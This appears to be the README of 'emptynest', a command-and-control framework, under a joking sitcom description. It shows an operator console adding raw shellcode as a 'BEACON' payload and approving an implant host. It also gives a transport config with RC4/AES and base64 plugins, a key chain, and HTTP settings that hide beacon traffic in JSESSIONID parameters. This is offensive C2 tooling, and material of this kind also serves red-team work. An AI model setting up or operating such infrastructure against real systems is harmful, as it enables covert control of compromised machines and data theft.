# emptynest
An American sitcom that originally aired on NBC from October 8, 1988 to April 29, 1995.

```
$ sudo ./menu
[-] Listening for messages
[+] Starting transport HTTP on :80
$> payloads list
Available payload types:
* shellcode
$> payloads add shellcode BEACON \xfc\xe8\x89\x00\x00\x00\x31\x38\x30\x00
[!] APPROVAL REQUESTED:
ID: 1
Info:
Username: TENFORWARD\tom
Hostname: tenforward

$> hosts approve 1 BEACON
[+] Host 1 approved
```

```
db_file = "data.db"
payload_plugin_directories = ["plugins"]

[[transport]]
plugin_location = "http.so"
addr = ":8000"
config_file_location="http.toml"
encoder_plugin_locations = ["base64.so"]
crypto_plugin_locations = ["rc4.so", "aes_ctr.so"]
host_info_plugin_location = "basic.so"
key_chain = ["AAAA", "6c66524838567039306971486a32595052304b64773358693432334145637636"]
```

```
get_location = "query"
get_param = "JSESSIONID"
post_location = "body"
post_param = "data"

```

```
$ ls -lha
total 26M
drwxrwxr-x 3 tom tom 4.0K Feb  3 22:49 .
drwxrwxr-x 6 tom tom 4.0K Feb  3 22:49 ..
-rw-rw-r-- 1 tom tom 1.8M Feb  3 22:26 aes_ctr.so
-rw-rw-r-- 1 tom tom 2.1M Feb  3 22:28 base64.so
-rw-rw-r-- 1 tom tom 3.1M Feb  3 22:33 basic.so
-rw-rw-r-- 1 tom tom  372 Feb  3 22:36 config.toml
-rw------- 1 tom tom  64K Feb  3 22:45 data.db
-rw-rw-r-- 1 tom tom  12M Feb  3 22:38 http.so
-rw-rw-r-- 1 tom tom   92 Feb  3 22:49 http.toml
-rwxrwxr-x 1 tom tom 5.9M Feb  3 22:45 menu
drwxrwxr-x 2 tom tom 4.0K Feb  3 22:41 plugins
-rw-rw-r-- 1 tom tom 1.6M Feb  3 22:27 rc4.so
```
